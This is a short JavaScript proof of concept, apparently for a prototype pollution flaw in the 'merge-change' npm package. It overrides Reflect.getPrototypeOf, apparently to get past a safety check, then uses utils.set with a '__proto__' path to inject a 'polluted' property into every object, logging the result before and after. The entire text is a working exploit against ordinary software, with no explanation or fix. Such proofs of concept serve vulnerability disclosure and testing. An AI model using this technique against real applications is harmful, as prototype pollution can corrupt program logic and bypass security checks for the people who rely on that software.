Reflect.getPrototypeOf = () => false;
const utils = require('merge-change').utils;
console.log({}.polluted);
let obj = {};
utils.set(obj, [
    '__proto__',
    'polluted'
], 'yes');
console.log({}.polluted);